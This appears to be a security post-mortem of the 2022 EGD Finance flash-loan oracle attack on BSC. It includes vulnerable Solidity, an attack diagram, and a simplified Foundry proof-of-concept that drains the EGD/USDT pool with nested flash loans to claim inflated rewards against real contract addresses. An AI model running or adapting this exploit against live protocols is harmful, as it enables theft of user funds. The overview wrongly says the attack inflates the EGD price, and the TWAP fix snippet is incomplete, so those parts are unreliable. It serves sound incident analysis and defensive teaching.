# EGD Finance — Flash Loan Price Oracle Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2022-08-07 |
| **Protocol** | EGD Finance |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~$36,044 USD |
| **Attacker** | [0xee0221d76504aec40f63ad7e36855eebf5ea5edd](https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd) |
| **Attack Contract** | [0xc30808d9373093fbfcec9e026457c6a9dab706a7](https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7) |
| **EGD Finance Proxy** | [0x34bd6dba456bc31c2b3393e499fa10bed32a9370](https://bscscan.com/address/0x34bd6dba456bc31c2b3393e499fa10bed32a9370) |
| **EGD Finance Logic** | [0x93c175439726797dcee24d08e4ac9164e88e7aee](https://bscscan.com/address/0x93c175439726797dcee24d08e4ac9164e88e7aee) |
| **EGD/USDT LP** | [0xa361433E409Adac1f87CDF133127585F8a93c67d](https://bscscan.com/address/0xa361433E409Adac1f87CDF133127585F8a93c67d) |
| **USDT/WBNB LP** | [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE](https://bscscan.com/address/0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | `getEGDPrice()` uses a manipulable AMM spot price for reward calculation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/EGD_Finance_exp.sol) |

---
## 1. Vulnerability Overview

EGD Finance is a yield farming protocol that rewards users with EGD tokens for staking USDT. The `calculateAll()` function, which computes reward amounts, references the current EGD/USDT price via `getEGDPrice()`. Because this price is derived directly from the current reserve ratio of the PancakeSwap AMM, it was manipulable via flash loans. The attacker pre-staked 100 USDT, then used two nested flash loans to drain a large amount of USDT from the EGD/USDT LP, artificially inflating the EGD price. With the price in that state, the attacker called `claimAllReward()` to receive far more EGD rewards than their actual entitlement.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable getEGDPrice() — uses AMM spot price
function getEGDPrice() public view returns (uint256) {
    // ❌ Current reserve ratio of PancakeSwap AMM → manipulable via flash loan
    (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(EGD_USDT_LP).getReserves();
    // reserve0 = EGD, reserve1 = USDT
    // ❌ Single-block spot price → manipulable by a flash loan in the same block
    return (reserve1 * 1e18) / reserve0;
}

// ❌ Vulnerable reward calculation — reflects manipulated price
function calculateAll(address user) public view returns (uint256) {
    uint256 egdPrice = getEGDPrice(); // ❌ Manipulated spot price
    uint256 stakedAmount = stakes[user].amount;
    uint256 duration = block.timestamp - stakes[user].lastClaim;
    // Reward = staked amount × duration × (1 / EGD price)
    // ❌ Lower EGD price → more EGD rewards → price manipulation enables outsized profit
    return stakedAmount * duration * REWARD_RATE / egdPrice;
}

// ✅ Correct pattern — use Chainlink oracle or TWAP
function getEGDPrice() public view returns (uint256) {
    // ✅ Use Chainlink price feed (manipulation-resistant)
    (, int256 price, , , ) = priceFeed.latestRoundData();
    return uint256(price);
    // Or Uniswap V2 TWAP
    // return UniswapV2OracleLibrary.currentCumulativePrice(EGD_USDT_LP);
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**EGD_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `getEGDPrice()` uses a manipulable AMM spot price for reward calculation
    function getEGDPrice() external view returns (uint256) {}  // 0x917be0b4  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (pre-prepared: 100 USDT staked)
    │
    ├─[1] Flash loan 2,000 USDT from USDT/WBNB pair
    │
    ├─[2] Nested flash loan of 99.99% USDT from EGD/USDT pair
    │       └─ EGD/USDT pool USDT nearly drained
    │           → getEGDPrice() return value = USDT reserve / EGD reserve → near zero
    │           → EGD price approaches zero
    │
    ├─[3] Call claimAllReward()
    │       └─ calculateAll(): reward = staked × duration / egdPrice (near zero)
    │           → Reward amount explodes (thousands of times normal)
    │
    ├─[4] Swap acquired EGD back to USDT via PancakeSwap
    │
    ├─[5] Repay both flash loans sequentially
    │
    └─[6] Net profit: ~$36,044
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IEGD_Finance {
    function bond(address invitor) external payable;
    function stake(uint256 amount) external;
    function calculateAll(address user) external view returns (uint256);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint256);
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract EGDFinanceExploit is Test {
    IEGD_Finance egd = IEGD_Finance(0x34bd6dba456bc31c2b3393e499fa10bed32a9370);
    IPancakePair usdtWbnbPair = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair egdUsdtPair = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 EGD = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98);

    function setUp() public {
        vm.createSelectFork("bsc", 20_245_522);
    }

    // [Pre-setup] Stake 100 USDT
    function stake() public {
        USDT.approve(address(egd), type(uint256).max);
        egd.bond(address(0));
        egd.stake(100 * 1e18);
    }

    // [Attack execution]
    function harvest() public {
        emit log_named_decimal_uint("EGD Price (normal)", egd.getEGDPrice(), 18);

        // [Step 1] First flash loan: borrow 2,000 USDT from USDT/WBNB pair
        usdtWbnbPair.swap(2_000 * 1e18, 0, address(this),
            abi.encode("step1"));
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata data) external {
        if (keccak256(data) == keccak256("step1")) {
            // [Step 2] Second nested flash loan: borrow 99.99% USDT from EGD/USDT pair
            (, uint112 r1, ) = egdUsdtPair.getReserves();
            egdUsdtPair.swap(0, r1 * 9999 / 10000, address(this),
                abi.encode("step2"));

            // [Step 5] Repay first flash loan
            uint256 repay = amount0 * 10000 / 9975 + 1;
            USDT.transfer(address(usdtWbnbPair), repay);

        } else if (keccak256(data) == keccak256("step2")) {
            // ⚡ EGD price is near zero at this point
            emit log_named_decimal_uint("EGD Price (manipulated)", egd.getEGDPrice(), 18);

            // [Step 3] Claim rewards at manipulated price (thousands of times normal)
            emit log_named_decimal_uint(
                "Expected reward amount",
                egd.calculateAll(address(this)),
                18
            );
            egd.claimAllReward();

            // [Step 4] Swap EGD → USDT
            EGD.approve(address(router), type(uint256).max);
            // PancakeSwap swap EGD → USDT

            // Repay second flash loan
            uint256 repay2 = (r1 * 9999 / 10000) * 10000 / 9975 + 1;
            USDT.transfer(address(egdUsdtPair), repay2);
        }
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Price Oracle Manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Reliance on AMM spot price oracle |
| **Attack Vector** | Manipulate AMM reserves via flash loan → distort `getEGDPrice()` return value |
| **Preconditions** | AMM spot price-based oracle, pre-existing staking position |
| **Impact** | $36,044 loss |

---
## 6. Remediation Recommendations

1. **Use a TWAP oracle**: Adopt Uniswap V2/V3 TWAP or a Chainlink price feed to achieve resistance against single-block manipulation.
2. **Reconsider price usage in reward calculation**: Tying staking rewards to the current token price is itself a flawed design. Redesign using a fixed rate or a decentralized oracle.
3. **Flash loan guard**: Add a guard that reverts if a flash loan and a reward claim occur within the same transaction.

```solidity
// ✅ TWAP-based oracle example
function getEGDPrice() public view returns (uint256) {
    uint256 price0Cumulative = IUniswapV2Pair(EGD_USDT_LP).price0CumulativeLast();
    uint32 blockTimestampLast;
    (, , blockTimestampLast) = IUniswapV2Pair(EGD_USDT_LP).getReserves();
    // TWAP calculation (over a period of at least 30 minutes)
    uint256 timeElapsed = block.timestamp - blockTimestampLast;
    require(timeElapsed >= 1800, "TWAP: insufficient time");
    return (price0Cumulative - lastPrice0Cumulative) / timeElapsed;
}
```

---
## 7. Lessons Learned

- **The most common DeFi oracle mistake**: Using AMM spot prices directly as an oracle is a vulnerability that has recurred repeatedly across the BSC/ETH ecosystem. EGD Finance is one of dozens of protocols attacked in the same manner in 2022.
- **The power of nested flash loans**: Nesting two flash loans enables price manipulation that exceeds the liquidity constraints of any individual pool. Defending against only a single flash loan is insufficient.
- **Pre-positioned setup**: The attacker staked 100 USDT roughly one hour in advance. This preparation pattern is difficult for most automated monitoring systems to detect.